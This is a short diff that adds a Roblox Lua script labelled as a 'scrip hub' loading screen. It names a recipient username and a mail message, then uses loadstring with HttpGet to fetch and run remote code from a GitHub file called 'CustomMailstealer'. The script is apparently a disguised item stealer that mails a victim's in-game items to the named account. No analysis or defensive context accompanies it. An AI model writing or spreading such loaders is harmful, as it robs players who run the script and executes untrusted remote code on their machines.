@@ -1,0 +1,5 @@
+Username = "uwncro"
+G_LoadingScreen = "syall scrip hub"
+G_Mailmessage = "RAHH"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
